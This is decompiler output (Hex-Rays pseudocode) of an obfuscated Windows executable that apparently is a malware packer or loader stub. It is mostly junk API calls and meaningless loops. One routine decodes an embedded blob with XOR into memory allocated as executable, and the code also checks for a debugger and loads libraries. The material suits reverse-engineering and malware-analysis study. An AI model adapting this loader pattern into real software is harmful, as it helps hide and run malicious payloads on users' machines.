/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// DWORD __userpurge sub_401008@<eax>(int a1@<eax>, int a2@<edx>, int a3@<edi>, int a4, int a5);
// void *__userpurge sub_401078@<eax>(int a1@<edx>, int a2@<ebx>, int a3@<esi>, int a4, int a5, int a6);
// int __userpurge sub_4010CC@<eax>(int a1@<ebx>, int a2@<edi>, int a3, int a4, int a5, int a6);
// HANDLE __userpurge sub_401138@<eax>(int a1@<edi>, int a2@<esi>, int a3, int a4, int a5, int a6);
// void *__userpurge sub_4011A4@<eax>(int a1@<ebx>, int a2@<esi>, int a3, int a4, int a5, int a6);
// HWND __userpurge sub_401274@<eax>(int a1@<eax>, int a2@<ebx>, int a3@<esi>, int a4, int a5);
// HWND __userpurge sub_4012D0@<eax>(HWND a1@<eax>, int a2@<ecx>, int a3@<ebx>, int a4, int a5, int a6, int a7);
void start();
// DWORD __userpurge sub_401340@<eax>(int a1@<eax>, int a2@<edi>, int a3@<esi>, int a4, int a5, int a6, int a7);
// void __userpurge sub_4013AC(int a1@<ebx>, unsigned int a2@<edi>, int a3, int a4, int a5);
// UINT __userpurge sub_401410@<eax>(int a1@<eax>, int a2@<edx>, int a3@<edi>, int a4@<esi>, int a5, int a6, int a7, int a8);
// HWND __userpurge sub_401478@<eax>(int a1@<ebx>, int a2, int a3);
// HWND __userpurge sub_40150C@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5, int a6, int a7);
// HMODULE __userpurge sub_401568@<eax>(int a1@<eax>, int a2@<ecx>, int a3@<ebx>, int a4@<edi>, int a5, int a6, int a7);
// void __userpurge sub_4015E4(int a1@<eax>, int a2@<edi>, int a3, int a4, int a5);
// HANDLE __userpurge sub_401640@<eax>(int a1@<eax>, int a2@<ebx>, int a3, int a4, int a5);
DWORD __stdcall sub_4016B4(int a1, int a2, int a3, int a4);
// BOOL __userpurge sub_40172C@<eax>(int a1@<esi>, int a2, int a3, int a4, int a5);
// int __userpurge sub_4017AC@<eax>(int a1@<edx>, int a2@<esi>, int a3, int a4, int a5);
// int __userpurge sub_40181C@<eax>(int a1@<ebx>, int a2, int a3, int a4);
// void *__userpurge sub_40186C@<eax>(int a1@<ebx>, int a2@<esi>, int a3, int a4);
// UINT __userpurge sub_401954@<eax>(int a1@<ebx>, unsigned int a2@<edi>, int a3, int a4, int a5);
// HWND __userpurge sub_4019B4@<eax>(int a1@<edi>, int a2@<esi>, int a3, int a4, int a5);
// DWORD __userpurge sub_401A20@<eax>(int a1@<ebx>, int a2, int a3, int a4, int a5);
// HANDLE __stdcall GetCurrentProcess();
// BOOL __stdcall DeleteFileA(LPCSTR lpFileName);
// BOOL __stdcall IsValidCodePage(UINT CodePage);
// void __stdcall Sleep(DWORD dwMilliseconds);
// HANDLE __stdcall GetCurrentThread();
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// LPSTR __stdcall GetCommandLineA();
// DWORD __stdcall GetCurrentProcessId();
// DWORD __stdcall GetCurrentThreadId();
// int __stdcall GetThreadPriority(HANDLE hThread);
// BOOL __stdcall IsDebuggerPresent();
// LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// UINT __stdcall GetDriveTypeA(LPCSTR lpRootPathName);
// HWND __stdcall GetForegroundWindow();
// HWND __stdcall GetFocus();
// HWND __stdcall GetActiveWindow();

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN loc_401208; // weak
_UNKNOWN unk_403000; // weak
_UNKNOWN unk_403600; // weak
_UNKNOWN unk_4036D4; // weak
_UNKNOWN unk_403718; // weak
_UNKNOWN unk_403730; // weak
_UNKNOWN unk_40373C; // weak
_DWORD dword_4037CC[22] = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }; // idb
_UNKNOWN unk_403824; // weak
_UNKNOWN unk_403890; // weak
_UNKNOWN unk_4038C8; // weak
_UNKNOWN unk_4038E4; // weak
_UNKNOWN unk_4039BC; // weak
_UNKNOWN unk_4039C0; // weak
_UNKNOWN unk_403A18; // weak
_DWORD dword_403A7C[353] =
{
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  1953392983,
  1819965034,
  775041898,
  7105636,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  
}; // idb


//----- (00401008) --------------------------------------------------------
DWORD __userpurge sub_401008@<eax>(int a1@<eax>, int a2@<edx>, int a3@<edi>, int a4, int a5)
{
  int v5; // esi
  int v7; // [esp-4h] [ebp-7Ch]
  int v8; // [esp+10h] [ebp-68h]
  int v9; // [esp+1Ch] [ebp-5Ch]
  int v10; // [esp+64h] [ebp-14h]

  v7 = a2 + 1024;
  sub_401410(a1, a2, a3, a2 + 1024, v8, v10, a1, a2);
  v5 = v7;
  *(_DWORD *)(v7 - 544) -= 802084832;
  IsValidCodePage(0x362u);
  *(_DWORD *)(v5 - 520) = 5;
  while ( *(_DWORD *)(v5 - 520) )
  {
    --*(_DWORD *)(v5 - 520);
    v9 |= v5;
  }
  return GetCurrentProcessId();
}
// 401008: could not find valid save-restore pair for esi
// 40101F: variable 'v8' is possibly undefined
// 40101F: variable 'v10' is possibly undefined
// 40105A: variable 'v9' is possibly undefined

//----- (00401078) --------------------------------------------------------
void *__userpurge sub_401078@<eax>(int a1@<edx>, int a2@<ebx>, int a3@<esi>, int a4, int a5, int a6)
{
  int i; // edi

  sub_401274((int)&unk_403730, a2, a3, *((_DWORD *)&unk_403730 + 267), a1);
  GetThreadPriority((HANDLE)0xFFFFFFFE);
  for ( i = 0; i != 3; ++i )
    *((_DWORD *)&unk_403730 + 203) ^= 0xFFFFFF9B;
  *((_DWORD *)&unk_403730 + 211) -= 3;
  DeleteFileA(0);
  return &unk_403730;
}

//----- (004010CC) --------------------------------------------------------
int __userpurge sub_4010CC@<eax>(int a1@<ebx>, int a2@<edi>, int a3, int a4, int a5, int a6)
{
  int v6; // eax
  int result; // eax
  int i; // [esp+ACh] [ebp-44h]
  int v9; // [esp+D8h] [ebp-18h]

LABEL_1:
  v6 = GetDriveTypeA(0);
  for ( i = 0; i != 5; ++i )
  {
    dword_4037CC[-158] ^= a1;
    if ( (unsigned int)dword_4037CC < 0x720 )
      goto LABEL_1;
  }
  sub_4019B4(a2, 0, v6, 0, v9);
  Sleep(0xBu);
  return result;
}
// 401116: variable 'v9' is possibly undefined

//----- (00401138) --------------------------------------------------------
HANDLE __userpurge sub_401138@<eax>(int a1@<edi>, int a2@<esi>, int a3, int a4, int a5, int a6)
{
  DWORD v6; // eax
  int v7; // ebx
  int v9; // [esp+94h] [ebp-50h]
  int v10; // [esp+C8h] [ebp-1Ch]

  do
  {
    do
      v10 |= 0x48u;
    while ( &unk_4036D4 == (_UNKNOWN *)64912 );
    v6 = GetCurrentThreadId();
    v7 = 5;
    do
    {
      v9 -= a1;
      v6 ^= 0x6337DA0Fu;
      --v7;
    }
    while ( v7 );
    sub_4011A4(0, a2, *((_DWORD *)&unk_4036D4 + 35), 0, *((_DWORD *)&unk_4036D4 + 273), *((_DWORD *)&unk_4036D4 + 141));
  }
  while ( (unsigned int)&unk_4036D4 <= 0xEA94 );
  return GetCurrentThread();
}
// 401148: variable 'v10' is possibly undefined
// 401160: variable 'v9' is possibly undefined

//----- (004011A4) --------------------------------------------------------
void *__userpurge sub_4011A4@<eax>(int a1@<ebx>, int a2@<esi>, int a3, int a4, int a5, int a6)
{
  int v6; // edx
  char v7; // cf
  int v9; // [esp+48h] [ebp-CCh]
  int v10; // [esp+60h] [ebp-B4h]
  int v11; // [esp+D4h] [ebp-40h]
  int v12; // [esp+F0h] [ebp-24h]

  GetCurrentThread();
  for ( unk_4036D4 = 3; unk_4036D4; *((_DWORD *)&unk_4036D4 + 17) = v6 )
  {
    --unk_4036D4;
    a1 &= v10;
  }
  sub_4016B4(v9, a2, a2, v11);
  *((_DWORD *)&unk_4036D4 + 56) += a2 + (__CFADD__(v7, v12) | __CFADD__(v7 + v12, -99));
  GetCurrentThread();
  return &unk_4036D4;
}
// 4011D4: variable 'v10' is possibly undefined
// 4011DA: variable 'v6' is possibly undefined
// 4011EB: variable 'v9' is possibly undefined
// 4011EB: variable 'v11' is possibly undefined
// 4011F1: variable 'v7' is possibly undefined
// 4011F1: variable 'v12' is possibly undefined

//----- (00401274) --------------------------------------------------------
HWND __userpurge sub_401274@<eax>(int a1@<eax>, int a2@<ebx>, int a3@<esi>, int a4, int a5)
{
  int i; // eax
  int v7; // [esp-4h] [ebp-B8h]
  int v8; // [esp+3Ch] [ebp-78h]
  int v9; // [esp+5Ch] [ebp-58h]
  int v10; // [esp+90h] [ebp-24h]

  v7 = a1 + 248;
  GetForegroundWindow();
  for ( i = 0; i != 5; ++i )
  {
    v9 |= 0xF133B6AD;
    a3 -= *(_DWORD *)(v7 + 84);
  }
  sub_4017AC(v7, v8 ^ a3, *(_DWORD *)(v7 + 1460), v10, a2);
  return GetFocus();
}
// 40129B: variable 'v9' is possibly undefined
// 4012AB: variable 'v8' is possibly undefined
// 4012B9: variable 'v10' is possibly undefined

//----- (004012D0) --------------------------------------------------------
HWND __userpurge sub_4012D0@<eax>(HWND a1@<eax>, int a2@<ecx>, int a3@<ebx>, int a4, int a5, int a6, int a7)
{
  do
  {
    sub_401568((int)a1, a2, a3, (int)&unk_4038C8, (int)a1, *((_DWORD *)&unk_4038C8 + 28), (int)a1);
    *((_DWORD *)&unk_4038C8 - 64) &= 0xFFFFFFF0;
    a1 = GetActiveWindow();
    *((_DWORD *)&unk_4038C8 - 108) = 0;
    while ( *((_DWORD *)&unk_4038C8 - 108) != 5 )
    {
      ++*((_DWORD *)&unk_4038C8 - 108);
      a2 &= a3;
      a3 |= 0xFFFFFFA7;
    }
  }
  while ( (unsigned int)&unk_4038C8 <= 0x4326 );
  return GetForegroundWindow();
}
// 4012D0: could not find valid save-restore pair for edi
// 4012E6: variable 'a2' is possibly undefined

//----- (00401334) --------------------------------------------------------
void start()
{
  JUMPOUT(0x401C03);
}
// 40133D: control flows out of bounds to 401C03

//----- (00401340) --------------------------------------------------------
DWORD __userpurge sub_401340@<eax>(int a1@<eax>, int a2@<edi>, int a3@<esi>, int a4, int a5, int a6, int a7)
{
  int v8; // [esp+34h] [ebp-34h]
  int v9; // [esp+48h] [ebp-20h]

  do
  {
    sub_401008(a1, (int)&unk_403600, a2, v8, *((_DWORD *)&unk_403600 + 230));
    v9 ^= 0xDu;
    *((_DWORD *)&unk_403600 + 133) ^= a3;
    a1 = DeleteFileA(0);
    *((_DWORD *)&unk_403600 + 11) = 0;
    while ( *((_DWORD *)&unk_403600 + 11) != 5 )
    {
      ++*((_DWORD *)&unk_403600 + 11);
      if ( (unsigned int)&unk_403600 <= 0x6F7B )
        JUMPOUT(0x40133F);
      a3 &= *((_DWORD *)&unk_403600 + 73);
    }
  }
  while ( (unsigned int)&unk_403600 < 0xD46F );
  return GetCurrentThreadId();
}
// 40138A: control flows out of bounds to 40133F
// 401357: variable 'v8' is possibly undefined
// 40135D: variable 'v9' is possibly undefined

//----- (004013AC) --------------------------------------------------------
void __userpurge sub_4013AC(int a1@<ebx>, unsigned int a2@<edi>, int a3, int a4, int a5)
{
  BOOL v5; // eax
  int v6; // [esp+24h] [ebp-FCh]
  int v7; // [esp+D0h] [ebp-50h]
  int v8; // [esp+10Ch] [ebp-14h]
  int v9; // [esp+11Ch] [ebp-4h]

  sub_401954(a1, a2, v8, *((_DWORD *)&unk_403718 + 188), v7);
  v5 = DeleteFileA(0);
  v9 = 4;
  do
  {
    v6 &= v5;
    --v9;
  }
  while ( v9 );
  Sleep(0xAu);
}
// 4013AC: could not find valid save-restore pair for esi
// 4013C9: variable 'v8' is possibly undefined
// 4013C9: variable 'v7' is possibly undefined
// 4013E9: variable 'v6' is possibly undefined

//----- (00401410) --------------------------------------------------------
UINT __userpurge sub_401410@<eax>(int a1@<eax>, int a2@<edx>, int a3@<edi>, int a4@<esi>, int a5, int a6, int a7, int a8)
{
  char v8; // cf
  int v9; // edx
  int v11; // [esp+B8h] [ebp-38h]

  do
  {
    a1 = sub_4010CC((int)&unk_4039C0, a3, a1, a2, *((_DWORD *)&unk_4039C0 + 202), *((_DWORD *)&unk_4039C0 + 165));
    a2 = v9 - (v8 + a1);
  }
  while ( (unsigned int)&unk_4039C0 < 0x2A76 );
  GetCurrentThread();
  *((_DWORD *)&unk_4039C0 - 12) = 3;
  while ( *((_DWORD *)&unk_4039C0 - 12) )
  {
    --*((_DWORD *)&unk_4039C0 - 12);
    a4 += v11 + __CFADD__(*((_DWORD *)&unk_4039C0 + 27), a4) + *((_DWORD *)&unk_4039C0 + 27);
  }
  return GetDriveTypeA(0);
}
// 401410: could not find valid save-restore pair for ebx
// 401436: variable 'v9' is possibly undefined
// 401436: variable 'v8' is possibly undefined
// 401456: variable 'v11' is possibly undefined

//----- (00401478) --------------------------------------------------------
HWND __userpurge sub_401478@<eax>(int a1@<ebx>, int a2, int a3)
{
  char *v3; // eax
  int v4; // edx
  char *v5; // eax
  _DWORD *v6; // edi
  unsigned int i; // ecx
  unsigned int v8; // edx
  int v10; // [esp+DCh] [ebp-48h]

LABEL_1:
  a1 |= *((_DWORD *)&unk_4038E4 - 115) | 0xF;
  v3 = (char *)VirtualAlloc(0, 0x510u, 0x1000u, 0x40u);
  *((_DWORD *)&unk_4038E4 + 91) = v3;
  v5 = v3 + 180;
  v6 = &unk_403000;
  for ( i = 0; i != 1296; i += 4 )
  {
    v10 ^= a1;
    ++v6;
    v8 = a1 & v4;
    a1 = *(v6 - 1);
    *((_DWORD *)v5 - 45) = a1;
    *((_DWORD *)&unk_4038E4 - 195) -= (v8 < i) - 87;
    v5 += 4;
    v4 = *((_DWORD *)&unk_4038E4 + 79) ^ (v8 - i);
    *((_DWORD *)v5 - 46) ^= 0xAC87FA29;
    if ( (unsigned int)&unk_4038E4 <= 0xBAE7 )
      goto LABEL_1;
  }
  return GetActiveWindow();
}
// 4014BE: variable 'v10' is possibly undefined
// 4014C4: variable 'v4' is possibly undefined

//----- (0040150C) --------------------------------------------------------
HWND __userpurge sub_40150C@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5, int a6, int a7)
{
  int v7; // esi
  int v8; // ecx
  int v10; // [esp-4h] [ebp-78h]
  int v11; // [esp+18h] [ebp-5Ch]
  int v12; // [esp+4Ch] [ebp-28h]

  v10 = a2 - 1256;
  sub_40172C(a2 - 1256, a3, a1, v12, a4);
  v7 = v10;
  DeleteFileA(0);
  v11 = 4;
  do
  {
    *(_DWORD *)(v7 + 368) = -11;
    *(_DWORD *)(v7 + 68) += v8;
    --v11;
  }
  while ( v11 );
  return GetActiveWindow();
}
// 40150C: could not find valid save-restore pair for esi
// 401523: variable 'v12' is possibly undefined
// 401545: variable 'v8' is possibly undefined

//----- (00401568) --------------------------------------------------------
HMODULE __userpurge sub_401568@<eax>(int a1@<eax>, int a2@<ecx>, int a3@<ebx>, int a4@<edi>, int a5, int a6, int a7)
{
  int v7; // ebx
  const CHAR *v8; // edx
  HMODULE result; // eax
  int v10; // [esp+Ch] [ebp-54h]

  dword_403A7C[-195] += sub_40150C(a1, (int)dword_403A7C, a2 - v10, a3, dword_403A7C[196], dword_403A7C[78], a2 - v10);
  v7 = 0;
  DeleteFileA(0);
  v8 = (const CHAR *)dword_403A7C;
  dword_403A7C[-141] = 5;
  do
  {
    v7 += dword_403A7C[-223];
    dword_403A7C[-142] = a4;
    --dword_403A7C[-141];
  }
  while ( dword_403A7C[-141] );
  do
    result = LoadLibraryA(v8 + 148);
  while ( result );
  return result;
}
// 40157A: variable 'v10' is possibly undefined
// 4015D0: variable 'v8' is possibly undefined

//----- (004015E4) --------------------------------------------------------
void __userpurge sub_4015E4(int a1@<eax>, int a2@<edi>, int a3, int a4, int a5)
{
  int v5; // ebx
  BOOL v6; // eax
  int v7; // ecx
  int i; // edi
  int v9; // [esp+94h] [ebp-70h]

  sub_401640(a1, a2 + 540, v9, a1, v9);
  v5 = a2 + 540;
  v6 = IsValidCodePage(0x362u);
  for ( i = 0; i != 3; ++i )
  {
    v7 &= 0xFFFFFFDE;
    *(_DWORD *)(v5 - 44) ^= v6;
  }
  Sleep(0xFu);
}
// 4015E4: could not find valid save-restore pair for ebx
// 4015FD: variable 'v9' is possibly undefined
// 401623: variable 'v7' is possibly undefined

//----- (00401640) --------------------------------------------------------
HANDLE __userpurge sub_401640@<eax>(int a1@<eax>, int a2@<ebx>, int a3, int a4, int a5)
{
  unsigned int v5; // esi
  int v6; // ecx

  sub_4013AC(a2, (unsigned int)&unk_40373C, a1, *((_DWORD *)&unk_40373C + 70), a2);
  v5 = (unsigned int)&unk_40373C + 980;
  if ( LoadLibraryA((LPCSTR)&unk_40373C + 980) )
    JUMPOUT(0x40166D);
  *((_DWORD *)&unk_40373C + 154) = 0;
  do
  {
    *((_DWORD *)&unk_40373C + 200) |= v6;
    v5 ^= v6;
    ++*((_DWORD *)&unk_40373C + 154);
  }
  while ( *((_DWORD *)&unk_40373C + 154) != 5 );
  return GetCurrentProcess();
}
// 40167A: control flows out of bounds to 40166D
// 401640: could not find valid save-restore pair for edi
// 401686: variable 'v6' is possibly undefined

//----- (004016B4) --------------------------------------------------------
DWORD __stdcall sub_4016B4(int a1, int a2, int a3, int a4)
{
  LPSTR v4; // eax
  int v6; // [esp+30h] [ebp-ECh]
  int v7; // [esp+98h] [ebp-84h]

  do
  {
    v7 ^= 0x76C20687u;
    sub_40181C((int)&unk_403824, v6, *((_DWORD *)&unk_403824 + 17), *((_DWORD *)&unk_403824 + 373));
    v4 = GetCommandLineA();
    *((_DWORD *)&unk_403824 - 169) = 0;
    while ( *((_DWORD *)&unk_403824 - 169) != 5 )
    {
      ++*((_DWORD *)&unk_403824 - 169);
      *((_DWORD *)&unk_403824 + 176) ^= (unsigned int)&unk_403824;
      *((_DWORD *)&unk_403824 + 78) ^= (unsigned int)&unk_403824;
    }
  }
  while ( (unsigned int)&unk_403824 <= 0x297B );
  *((_DWORD *)&unk_403824 - 118) ^= (unsigned int)v4;
  return GetCurrentProcessId();
}
// 4016B4: could not find valid save-restore pair for ebx
// 4016B4: could not find valid save-restore pair for edi
// 4016C5: variable 'v7' is possibly undefined
// 4016DF: variable 'v6' is possibly undefined

//----- (0040172C) --------------------------------------------------------
BOOL __userpurge sub_40172C@<eax>(int a1@<esi>, int a2, int a3, int a4, int a5)
{
  int v5; // edi
  int v6; // eax
  int v8; // [esp+2Ch] [ebp-F0h]
  int v9; // [esp+48h] [ebp-D4h]
  int v10; // [esp+78h] [ebp-A4h]
  int v11; // [esp+114h] [ebp-8h]

LABEL_1:
  v5 = a1 + 1148;
  a1 = *(_DWORD *)(a1 + 980);
  v6 = GetThreadPriority((HANDLE)0xFFFFFFFE);
  v8 = 4;
  do
  {
    if ( v5 == 2679 )
      goto LABEL_1;
    *(_DWORD *)(v5 - 124) &= a1;
    --v8;
  }
  while ( v8 );
  sub_401340(v6, v5, a1, v9, v10, v11, *(_DWORD *)(v5 + 504));
  return DeleteFileA(0);
}
// 40172C: could not find valid save-restore pair for edi
// 401789: variable 'v9' is possibly undefined
// 401789: variable 'v10' is possibly undefined
// 401789: variable 'v11' is possibly undefined

//----- (004017AC) --------------------------------------------------------
int __userpurge sub_4017AC@<eax>(int a1@<edx>, int a2@<esi>, int a3, int a4, int a5)
{
  int v5; // edi
  char v6; // cf
  int v7; // eax
  int v8; // ecx
  int v10; // [esp+54h] [ebp-CCh]
  int v11; // [esp+D4h] [ebp-4Ch]
  int v12; // [esp+D4h] [ebp-4Ch]
  int v13; // [esp+108h] [ebp-18h]

  v5 = a1 - 568;
  v12 = (a1 - 568) & v11;
  v7 = GetDriveTypeA(0);
  *(_DWORD *)(v5 + 732) = 5;
  do
  {
    a2 += v10 + v6;
    --*(_DWORD *)(v5 + 732);
    v6 = 0;
  }
  while ( *(_DWORD *)(v5 + 732) );
  sub_4015E4(v7, v5, v12 ^ v8, v13, *(_DWORD *)(v5 + 456));
  return GetThreadPriority((HANDLE)0xFFFFFFFE);
}
// 4017AC: could not find valid save-restore pair for edi
// 4017BD: variable 'v11' is possibly undefined
// 4017D7: variable 'v10' is possibly undefined
// 4017D7: variable 'v6' is possibly undefined
// 401803: variable 'v8' is possibly undefined
// 401804: variable 'v13' is possibly undefined

//----- (0040181C) --------------------------------------------------------
int __userpurge sub_40181C@<eax>(int a1@<ebx>, int a2, int a3, int a4)
{
  LPSTR v4; // eax
  unsigned int v5; // ecx
  int i; // edx
  unsigned int v8; // [esp+9Ch] [ebp-88h]
  int v9; // [esp+E0h] [ebp-44h]
  int v10; // [esp+104h] [ebp-20h]

  do
  {
    sub_401478(a1, a1, v9);
    v4 = GetCommandLineA();
    for ( i = 0; i != 5; ++i )
      v4 = (LPSTR)((unsigned int)&v4[-v10] & 0xFFFFFFFE);
    v8 = (__PAIR64__(v8, 5) - __PAIR64__(v5, 5)) >> 32;
  }
  while ( (unsigned int)(a1 - 664) < 0xA8FB );
  return GetThreadPriority((HANDLE)0xFFFFFFFE);
}
// 40181C: could not find valid save-restore pair for edi
// 401834: variable 'v9' is possibly undefined
// 401843: variable 'v10' is possibly undefined
// 40184F: variable 'v8' is possibly undefined
// 40184F: variable 'v5' is possibly undefined

//----- (0040186C) --------------------------------------------------------
void *__userpurge sub_40186C@<eax>(int a1@<ebx>, int a2@<esi>, int a3, int a4)
{
  bool v4; // cf
  int v5; // ecx
  int v6; // edx
  int v8; // [esp+10h] [ebp-68h]
  int v9; // [esp+54h] [ebp-24h]

  while ( (unsigned int)&unk_4039BC <= 0x9B15 )
    ;
  GetThreadPriority((HANDLE)0xFFFFFFFE);
  *((_DWORD *)&unk_4039BC - 3) = 0;
  do
  {
    v8 -= v4 + 69;
    a1 += a2;
    v4 = ++*((_DWORD *)&unk_4039BC - 3) < 4u;
  }
  while ( *((_DWORD *)&unk_4039BC - 3) != 4 );
  sub_401A20(a1, v9, *((_DWORD *)&unk_4039BC + 325), v5, *((_DWORD *)&unk_4039BC + 190));
  *((_DWORD *)&unk_4039BC - 131) ^= v6;
  GetThreadPriority((HANDLE)0xFFFFFFFE);
  return &unk_4039BC;
}
// 401894: variable 'v8' is possibly undefined
// 401894: variable 'v4' is possibly undefined
// 4018B4: variable 'v9' is possibly undefined
// 4018B4: variable 'v5' is possibly undefined
// 4018BA: variable 'v6' is possibly undefined

//----- (00401954) --------------------------------------------------------
UINT __userpurge sub_401954@<eax>(int a1@<ebx>, unsigned int a2@<edi>, int a3, int a4, int a5)
{
  int i; // esi
  char v6; // cf

  while ( &unk_403A18 == (_UNKNOWN *)33993 )
    ;
  GetCurrentThreadId();
  for ( i = 0; i != 3; ++i )
  {
    *((_DWORD *)&unk_403A18 - 31) += &unk_403A18;
    a1 |= 0x3Cu;
  }
  sub_40186C(a1, 3, a2, *((_DWORD *)&unk_403A18 + 81));
  *((_DWORD *)&unk_403A18 - 228) += (a2 < (unsigned int)v6 - 1832497000) + 76;
  return GetDriveTypeA(0);
}
// 401993: variable 'v6' is possibly undefined

//----- (004019B4) --------------------------------------------------------
HWND __userpurge sub_4019B4@<eax>(int a1@<edi>, int a2@<esi>, int a3, int a4, int a5)
{
  DWORD v5; // eax
  int v6; // edx
  int v8; // [esp+4h] [ebp-124h]
  int v9; // [esp+98h] [ebp-90h]
  int v10; // [esp+108h] [ebp-20h]

  sub_401138(a1, a2, *((_DWORD *)&unk_4038E4 + 366), a2, v10, *((_DWORD *)&unk_4038E4 + 22));
  *((_DWORD *)&unk_4038E4 + 97) += &unk_4038E4;
  v5 = GetCurrentProcessId();
  v8 = 4;
  do
  {
    v6 += v9;
    *((_DWORD *)&unk_4038E4 - 8) -= v5;
    --v8;
  }
  while ( v8 );
  return GetForegroundWindow();
}
// 4019B4: could not find valid save-restore pair for ebx
// 4019D3: variable 'v10' is possibly undefined
// 4019F4: variable 'v9' is possibly undefined
// 4019F4: variable 'v6' is possibly undefined

//----- (00401A20) --------------------------------------------------------
DWORD __userpurge sub_401A20@<eax>(int a1@<ebx>, int a2, int a3, int a4, int a5)
{
  int v5; // ecx
  int v7; // [esp+50h] [ebp-50h]

  ((void (__stdcall *)(_DWORD, int))loc_401208)(*((_DWORD *)&unk_403890 + 318), a1);
  IsDebuggerPresent();
  *((_DWORD *)&unk_403890 + 9) = 5;
  do
  {
    *((_DWORD *)&unk_403890 - 138) = v5;
    v7 += (int)&unk_403890;
    --*((_DWORD *)&unk_403890 + 9);
  }
  while ( *((_DWORD *)&unk_403890 + 9) );
  return GetCurrentThreadId();
}
// 401A55: variable 'v5' is possibly undefined
// 401A5B: variable 'v7' is possibly undefined

// nfuncs=40 queued=24 decompiled=24 lumina nreq=0 worse=0 better=0
// ALL OK, 24 function(s) have been successfully decompiled
